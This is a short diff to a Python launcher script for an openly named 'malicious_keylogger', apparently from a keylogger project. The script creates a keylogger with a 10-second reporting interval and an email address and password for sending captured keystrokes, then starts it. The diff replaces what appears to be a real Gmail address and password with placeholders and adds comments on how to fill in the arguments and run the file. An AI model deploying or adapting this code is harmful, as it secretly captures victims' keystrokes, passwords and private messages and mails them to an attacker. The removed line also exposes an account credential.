@@ -5,8 +5,10 @@ import keylogger
 
 # Initialize / create keylogger
 
-malicious_keylogger = keylogger.KeyLogger(10, 'completekeyloggerproject@gmail.com', 'Fi63J3vjCyE3')
-
+malicious_keylogger = keylogger.KeyLogger(10, 'abc@gmail.com', 'abc123')
+# (the above line says 10 seconds and email id and followed by password)
 # Execute Keylogger
 
 malicious_keylogger.start()
+
+# run this file by keeping both the file in same folder
